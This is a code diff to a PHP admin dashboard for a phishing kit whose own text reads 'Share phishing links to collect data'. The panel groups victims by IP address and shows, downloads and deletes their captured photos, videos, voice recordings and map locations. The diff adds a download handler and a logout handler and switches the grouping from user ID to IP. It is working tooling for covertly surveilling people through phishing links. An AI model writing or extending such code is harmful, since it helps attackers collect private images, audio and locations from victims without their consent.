@@ -57,28 +57,25 @@ $data_dir = 'data/';
 $captures_file = $data_dir . 'captures.json';
 if (!is_dir($data_dir)) mkdir($data_dir, 0777, true);
 
-// Load captures and group by user ID
+// 🔥 IP-BASED GROUPING
 $users = [];
 if (file_exists($captures_file)) {
-    $captures = json_decode(file_get_contents($captures_file), true) ?: [];
-    foreach ($captures as $capture) {
-        $user_id = $capture['id'] ?? 'unknown';
-        if (!isset($users[$user_id])) {
-            $users[$user_id] = [
-                'id' => $user_id,
-                'ip' => $capture['ip'] ?? 'N/A',
-                'user_agent' => $capture['user_agent'] ?? 'N/A',
-                'first_seen' => $capture['time'] ?? date('Y-m-d H:i:s'),
-                'captures' => []
-            ];
-        }
-        $users[$user_id]['captures'][] = $capture;
+    $all_data = json_decode(file_get_contents($captures_file), true) ?: [];
+    foreach ($all_data as $user_data) {
+        $ip = $user_data['ip'] ?? '0.0.0.0';
+        $users[$ip] = $user_data;
     }
 }
 
 // View single user
-if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
-    $user = $users[$_GET['view_user']];
+if (isset($_GET['view_user'])) {
+    $view_ip = $_GET['view_user'];
+    $user = $users[$view_ip] ?? null;
+    
+    if (!$user) {
+        header('Location: admin.php');
+        exit;
+    }
     ?>
     <!DOCTYPE html>
     <html>
@@ -96,7 +93,8 @@ if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
             .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:20px; }
             .card { background:rgba(255,255,255,0.03); border-radius:14px; overflow:hidden; border:1px solid rgba(255,255,255,0.06); }
             .card .preview { width:100%; height:200px; background:#0d0d20; display:flex; justify-content:center; align-items:center; font-size:50px; overflow:hidden; position:relative; }
-            .card .preview img, .card .preview video { width:100%; height:100%; object-fit:cover; }
+            .card .preview img { width:100%; height:100%; object-fit:cover; }
+            .card .preview video { width:100%; height:100%; object-fit:cover; }
             .card .info { padding:14px 16px; }
             .card .info .time { color:#666; font-size:12px; }
             .card .info .ip { color:#888; font-size:12px; }
@@ -105,12 +103,12 @@ if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
             .card .actions a:hover { opacity:0.8; }
             .btn-download { background:#00b894; color:#fff; }
             .btn-delete { background:#e74c3c; color:#fff; }
-            .empty { text-align:center; padding:60px 20px; color:#555; grid-column:1/-1; }
             .badge { display:inline-block; padding:2px 10px; border-radius:20px; font-size:10px; font-weight:bold; text-transform:uppercase; color:#fff; }
             .badge.photo { background:#00b894; }
             .badge.video { background:#9b59b6; }
             .badge.voice { background:#f39c12; }
             .badge.location { background:#3498db; }
+            .empty { text-align:center; padding:60px 20px; color:#555; grid-column:1/-1; }
             @media (max-width:600px) { .header { flex-direction:column; text-align:center; gap:15px; } .grid { grid-template-columns:1fr; } }
         </style>
     </head>
@@ -118,8 +116,8 @@ if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
         <div class="container">
             <div class="header">
                 <div>
-                    <h1>👤 User: <?= htmlspecialchars($user['id']) ?></h1>
-                    <div style="color:#666; font-size:13px;">🌐 IP: <?= htmlspecialchars($user['ip']) ?> | 📅 First seen: <?= htmlspecialchars($user['first_seen']) ?></div>
+                    <h1>👤 IP: <?= htmlspecialchars($user['ip']) ?></h1>
+                    <div style="color:#666; font-size:13px;">📅 First seen: <?= htmlspecialchars($user['first_seen'] ?? 'N/A') ?></div>
                 </div>
                 <a href="admin.php" class="btn-back">🔙 Back</a>
             </div>
@@ -130,18 +128,22 @@ if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
                     <?php foreach (array_reverse($user['captures']) as $index => $capture): ?>
                     <div class="card">
                         <div class="preview">
-                            <?php if (($capture['type'] ?? '') == 'photo' && !empty($capture['file'])): ?>
-                                <img src="<?= $capture['file'] ?>" alt="Photo">
-                            <?php elseif (($capture['type'] ?? '') == 'video' && !empty($capture['file'])): ?>
-                                <video src="<?= $capture['file'] ?>" muted></video>
-                            <?php elseif (($capture['type'] ?? '') == 'voice' && !empty($capture['file'])): ?>
-                                <div style="text-align:center; padding:20px;">
+                            <?php 
+                            $type = $capture['type'] ?? 'unknown';
+                            $file = $capture['file'] ?? '';
+                            ?>
+                            <?php if ($type == 'photo' && !empty($file) && file_exists($file)): ?>
+                                <img src="<?= $file ?>" alt="Photo">
+                            <?php elseif ($type == 'video' && !empty($file) && file_exists($file)): ?>
+                                <video src="<?= $file ?>" muted></video>
+                            <?php elseif ($type == 'voice' && !empty($file) && file_exists($file)): ?>
+                                <div style="text-align:center; padding:20px; width:100%;">
                                     <div style="font-size:50px;">🎤</div>
-                                    <audio controls style="width:100%; margin-top:10px;">
-                                        <source src="<?= $capture['file'] ?>" type="audio/mpeg">
+                                    <audio controls style="width:90%; margin-top:10px;">
+                                        <source src="<?= $file ?>" type="audio/mpeg">
                                     </audio>
                                 </div>
-                            <?php elseif (($capture['type'] ?? '') == 'location'): ?>
+                            <?php elseif ($type == 'location'): ?>
                                 <div style="text-align:center; padding:20px;">
                                     <div style="font-size:40px;">📍</div>
                                     <div style="font-size:14px; color:#aaa; margin-top:10px;">
@@ -151,21 +153,24 @@ if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
                                     <a href="https://maps.google.com/?q=<?= $capture['lat'] ?? '' ?>,<?= $capture['lng'] ?? '' ?>" target="_blank" style="color:#3498db; font-size:12px;">🗺️ View Map</a>
                                 </div>
                             <?php else: ?>
-                                <span style="font-size:40px; color:#333;">❓</span>
+                                <div style="text-align:center; padding:20px;">
+                                    <div style="font-size:40px; color:#555;">❓</div>
+                                    <div style="font-size:12px; color:#666;">Type: <?= htmlspecialchars($type) ?></div>
+                                </div>
                             <?php endif; ?>
-                            <span class="badge <?= $capture['type'] ?? 'unknown' ?>" style="position:absolute;top:10px;right:10px;">
-                                <?= $capture['type'] ?? 'Unknown' ?>
+                            <span class="badge <?= $type ?>" style="position:absolute;top:10px;right:10px;">
+                                <?= htmlspecialchars($type) ?>
                             </span>
                         </div>
                         <div class="info">
-                            <div class="time">🕐 <?= $capture['time'] ?? 'N/A' ?></div>
-                            <div class="ip">🌐 IP: <?= $capture['ip'] ?? 'N/A' ?></div>
+                            <div class="time">🕐 <?= htmlspecialchars($capture['time'] ?? 'N/A') ?></div>
+                            <div class="ip">🌐 IP: <?= htmlspecialchars($capture['ip'] ?? 'N/A') ?></div>
                         </div>
                         <div class="actions">
-                            <?php if (($capture['type'] ?? '') != 'location' && !empty($capture['file'])): ?>
-                                <a href="?download=<?= $index ?>&user=<?= $user['id'] ?>" class="btn-download">⬇️ Download</a>
+                            <?php if ($type != 'location' && !empty($file) && file_exists($file)): ?>
+                                <a href="?download=<?= $index ?>&user=<?= urlencode($user['ip']) ?>" class="btn-download">⬇️ Download</a>
                             <?php endif; ?>
-                            <a href="?delete=<?= $index ?>&user=<?= $user['id'] ?>" class="btn-delete" onclick="return confirm('Delete this capture?')">🗑️ Delete</a>
+                            <a href="?delete=<?= $index ?>&user=<?= urlencode($user['ip']) ?>" class="btn-delete" onclick="return confirm('Delete this capture?')">🗑️ Delete</a>
                         </div>
                     </div>
                     <?php endforeach; ?>
@@ -180,40 +185,55 @@ if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
 
 // Delete user data
 if (isset($_GET['delete_user']) && isset($users[$_GET['delete_user']])) {
-    $user_id = $_GET['delete_user'];
-    foreach ($users[$user_id]['captures'] as $capture) {
+    $ip = $_GET['delete_user'];
+    foreach ($users[$ip]['captures'] as $capture) {
         if (!empty($capture['file']) && file_exists($capture['file'])) {
             unlink($capture['file']);
         }
     }
-    unset($users[$user_id]);
-    $all_captures = [];
+    unset($users[$ip]);
+    $all_data = [];
     foreach ($users as $u) {
-        $all_captures = array_merge($all_captures, $u['captures']);
+        $all_data[] = $u;
     }
-    file_put_contents($captures_file, json_encode($all_captures, JSON_PRETTY_PRINT));
+    file_put_contents($captures_file, json_encode($all_data, JSON_PRETTY_PRINT));
     header('Location: admin.php');
     exit;
 }
 
 // Delete single capture from user
 if (isset($_GET['delete']) && isset($_GET['user']) && isset($users[$_GET['user']])) {
-    $user_id = $_GET['user'];
+    $ip = $_GET['user'];
     $index = $_GET['delete'];
-    if (isset($users[$user_id]['captures'][$index])) {
-        $capture = $users[$user_id]['captures'][$index];
+    if (isset($users[$ip]['captures'][$index])) {
+        $capture = $users[$ip]['captures'][$index];
         if (!empty($capture['file']) && file_exists($capture['file'])) {
             unlink($capture['file']);
         }
-        unset($users[$user_id]['captures'][$index]);
-        $users[$user_id]['captures'] = array_values($users[$user_id]['captures']);
-        $all_captures = [];
+        unset($users[$ip]['captures'][$index]);
+        $users[$ip]['captures'] = array_values($users[$ip]['captures']);
+        $all_data = [];
         foreach ($users as $u) {
-            $all_captures = array_merge($all_captures, $u['captures']);
+            $all_data[] = $u;
         }
-        file_put_contents($captures_file, json_encode($all_captures, JSON_PRETTY_PRINT));
-        header("Location: admin.php?view_user=$user_id");
+        file_put_contents($captures_file, json_encode($all_data, JSON_PRETTY_PRINT));
+        header("Location: admin.php?view_user=" . urlencode($ip));
         exit;
+    }
+}
+
+// Download single capture
+if (isset($_GET['download']) && isset($_GET['user'])) {
+    $ip = $_GET['user'];
+    $index = $_GET['download'];
+    if (isset($users[$ip]['captures'][$index])) {
+        $capture = $users[$ip]['captures'][$index];
+        if (!empty($capture['file']) && file_exists($capture['file'])) {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($capture['file']) . '"');
+            readfile($capture['file']);
+            exit;
+        }
     }
 }
 
@@ -227,6 +247,13 @@ if (isset($_GET['clear_all'])) {
         }
     }
     file_put_contents($captures_file, json_encode([]));
+    header('Location: admin.php');
+    exit;
+}
+
+// Logout
+if (isset($_GET['logout'])) {
+    session_destroy();
     header('Location: admin.php');
     exit;
 }
@@ -275,8 +302,8 @@ if (isset($_GET['clear_all'])) {
             border-bottom:1px solid rgba(255,255,255,0.05);
             display:flex; justify-content:space-between; align-items:center;
         }
-        .user-header .user-id { font-size:14px; color:#ff0066; font-weight:bold; }
-        .user-header .user-ip { font-size:12px; color:#666; }
+        .user-header .user-ip { font-size:14px; color:#ff0066; font-weight:bold; }
+        .user-header .user-first { font-size:12px; color:#666; }
         
         .user-body { padding:14px 18px; }
         .capture-item {
@@ -339,16 +366,13 @@ if (isset($_GET['clear_all'])) {
                     <div style="color:#555; font-size:14px;">Share phishing links to collect data</div>
                 </div>
             <?php else: ?>
-                <?php foreach ($users as $user_id => $user): ?>
+                <?php foreach ($users as $ip => $user): ?>
                 <div class="user-card">
                     <div class="user-header">
-                        <span class="user-id">👤 <?= htmlspecialchars($user_id) ?></span>
-                        <span class="user-ip">🌐 <?= htmlspecialchars($user['ip']) ?></span>
+                        <span class="user-ip">🌐 <?= htmlspecialchars($ip) ?></span>
+                        <span class="user-first">📅 <?= htmlspecialchars($user['first_seen'] ?? 'N/A') ?></span>
                     </div>
                     <div class="user-body">
-                        <div style="font-size:11px; color:#555; margin-bottom:8px;">
-                            📅 First seen: <?= htmlspecialchars($user['first_seen']) ?>
-                        </div>
                         <?php foreach (array_slice($user['captures'], -5) as $capture): ?>
                         <div class="capture-item">
                             <span class="type <?= $capture['type'] ?? 'unknown' ?>">
@@ -362,8 +386,8 @@ if (isset($_GET['clear_all'])) {
                         <?php endif; ?>
                     </div>
                     <div class="user-actions">
-                        <a href="?view_user=<?= $user_id ?>" class="btn-view">📂 View All Data</a>
-                        <a href="?delete_user=<?= $user_id ?>" class="btn-delete-user" onclick="return confirm('Delete this user?')">🗑️ Delete User</a>
+                        <a href="?view_user=<?= urlencode($ip) ?>" class="btn-view">📂 View All Data</a>
+                        <a href="?delete_user=<?= urlencode($ip) ?>" class="btn-delete-user" onclick="return confirm('Delete this user?')">🗑️ Delete User</a>
                     </div>
                 </div>
                 <?php endforeach; ?>
